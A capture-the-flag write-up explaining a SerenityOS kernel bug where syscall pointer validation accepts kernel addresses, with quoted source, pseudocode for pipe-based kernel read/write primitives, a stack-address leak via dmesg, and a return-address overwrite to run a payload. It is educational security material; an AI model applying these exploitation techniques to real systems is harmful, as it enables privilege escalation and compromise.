Challenge
=============
For this challenge we are given a remote shell on a machine running
[SerenityOS](https://github.com/SerenityOS/serenity/) and the flag is contained in the
block device /dev/hdb.

I figured that we would need to escalate privileges to read the flag so I
went searching for a suitable bug.

Bug
=============
SerenityOS does validation of pointers passed as syscall arguments
using the `Process::validate_(read|write)` functions.

```c++
ssize_t Process::sys$read(int fd, u8* buffer, ssize_t size)
{
    if (size < 0)
        return -EINVAL;
    if (size == 0)
        return 0;
    if (!validate_write(buffer, size))
        return -EFAULT;
     ...
    return description->read(buffer, size);
}
```
For example the code above shows how the read syscall does validation.

```c++
bool Process::validate_write(void* address, ssize_t size) const
{
    ASSERT(size >= 0);
    VirtualAddress first_address((u32)address);
    VirtualAddress last_address = first_address.offset(size - 1);
    if (is_ring0()) {
        ....
    }
    if (!size)
        return false;
    if (first_address.page_base() != last_address.page_base()) {
        if (!MM.validate_user_write(*this, last_address))
            return false;
    }
    return MM.validate_user_write(*this, last_address);                     [0]
}


bool MemoryManager::validate_user_write(const Process& process, VirtualAddress vaddr) const
 {
      auto* region = region_from_vaddr(process, vaddr);                                         [1]
      return region && region->is_writable();                                                               [2]
}
```
The real verification however is done in the  `MemoryManager::validate_user_(read|write)`
functions which are called from Process::validate(read|write) [0].
 `MemoryManager::validate_user_(read|write)` simply gets the region associated with the
 passed vaddr[1] and makes sure it is readable/writeable[2].

 ```c++
 Region* MemoryManager::region_from_vaddr(Process& process, VirtualAddress vaddr)
{
    if (auto* region = kernel_region_from_vaddr(vaddr))                                         [0]
        return region;
    return user_region_from_vaddr(process, vaddr);
}
```

Looking at region_from_vaddr we notice something that seems odd. Even though we
are supposed to be verifying a user pointer, it uses the function
`MemoryManager::kernel_region_from_vaddr` to find the region[0].

```c++
Region* MemoryManager::kernel_region_from_vaddr(VirtualAddress vaddr)
{
    if (vaddr.get() < 0xc0000000)                                                                               [0]
        return nullptr;
    for (auto& region : MM.m_kernel_regions) {
        if (region.contains(vaddr))                                                                               
            return &region;
    }
    return nullptr;
}
```
`MemoryManager::kernel_region_from_vaddr`  make sure that the address is above
`0xc0000000`[0] and if it is it then searches for the vaddr in the kernel memory map and
returns the region associated with it.

So this means that we can pass addresses that are above 0xc0000000
and they would pass validation and be treated like userspace addresses, which gives us
many avenues to read/write kernel data.

The comment in `MemoryManager::initialize_paging` confirms that something of value
should exist above `0xc0000000`.

```c++
// FIXME: We should move everything kernel-related above the 0xc0000000 virtual mark.

// Basic physical memory map:
// 0      -> 1 MB           We're just leaving this alone for now.
// 1      -> 3 MB           Kernel image.
// (last page before 2MB)   Used by quickmap_page().
// 2 MB   -> 4 MB           kmalloc_eternal() space.
// 4 MB   -> 7 MB           kmalloc() space.
// 7 MB   -> 8 MB           Supervisor physical pages (available for allocation!)
// 8 MB   -> MAX            Userspace physical pages (available for allocation!)

// Basic virtual memory map:
// 0 -> 4 KB                Null page (so nullptr dereferences crash!)
// 4 KB -> 8 MB             Identity mapped.
// 8 MB -> 3 GB             Available to userspace.
// 3GB  -> 4 GB             Kernel-only virtual address space (>0xc0000000)                 [0]
```

Note how 0xc0000000 is the start of "kernel-only virtual address space"[0], which I
presume userspace shouldn't be able to read and write to :P.

Exploit Strategy
==============
Using pipes we can read and write kernel memory pretty easily. Psuedocode is below.

```c++
int p[2];
pipe(p);

void kread(kaddr, buf, len){
        write(p[1], kaddr, len);
        read(p[0], buf, len);
}

void kwrite(kaddr, buf, len){
        write(p[1], buf, len);
        read(p[0], kaddr, len);
}
```

We needed to determine what actually was placed above `0xc0000000`.
Luckily this was quite easy as simply reading the contents of the `dmesg` command
made it clear that kernel stacks were always in this region.

```
anon@courage:$> dmesg
...
Allocated ring0 stack @ 0xc0a69000 - 0xc0a79000
Allocated ring0 stack @ 0xc0a7a000 - 0xc0a8a000
...
Allocated ring0 stack @ 0xc0b68000 - 0xc0b78000
anon@courage:$>
```

In fact all we had to do to leak a kernel stack of a child process was to fork and then
read the last line of `/proc/dmesg` as the kernel logs the address on process creation.

Gaining code execution after obtaining a child stack base is trivial. First we put the child
asleep using the `sleep` syscall.  Then we simply read the kernel
stack until we find the return address we want to overwrite, which in our case is
`syscall_asm_entry +24`, and then overwrite it with a pointer that points to the payload
of our choice. When the child wakes up it will now jump to our payload.


Reading Flag
==============

Initially I thought that obtaining root and mounting /dev/hdb would be enough to solve
the challenge. However the flag was just a text file and not a filesystem image so it can't
be mounted. This meant that we had to read the raw block device. To do this we made the
payload call `Device::get_device` to obtain the `Device` object associated with /dev/hdb
and then called `DiskDevice::read` on this object which finally did the reading of the flag.


Building
==============
The exploit is built using the SerenityOS build system. Place `exploit.cpp` into the
`Userland/` folder and type `make exploit` for the binary to be built.
